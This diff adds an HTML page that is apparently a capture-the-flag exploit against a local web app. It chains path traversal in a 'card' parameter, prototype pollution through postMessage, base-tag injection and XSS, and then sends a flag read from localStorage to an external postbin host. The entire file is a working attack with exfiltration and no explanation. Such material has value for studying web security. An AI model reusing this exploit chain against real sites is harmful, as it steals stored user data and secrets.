@@ -1,0 +1,20 @@
+<!DOCTYPE html>
+<html>
+    <body>
+        <script>
+            const sleep = (m) => new Promise(r => setTimeout(r, m));
+            const pwn = async () => {
+                let href = `/x/;window.parent.open('https://www.toptal.com/developers/postbin/1661918257442-1312295382376?flag='+JSON.parse(localStorage.saved).Default.flag);//`.replaceAll(';', encodeURIComponent(';'));
+                let card = `debug=</template><base href="${href}" /><template>`;
+                let w = window.open("http://localhost/?card=..%252f..%252f..%252f..%252f..%252f..%252f/B00TK1D/xss/main/test1.ae");
+                await sleep(1500);
+                w.frames[0].postMessage({type: "save", folder: "__proto__", name: "toString", card}, "*");
+                await sleep(1000);
+                w.frames[0].postMessage({type: "debug"}, "*");
+                await sleep(1000);
+                w.location = "http://localhost";
+            };
+            pwn();
+        </script>
+    </body>
+</html>
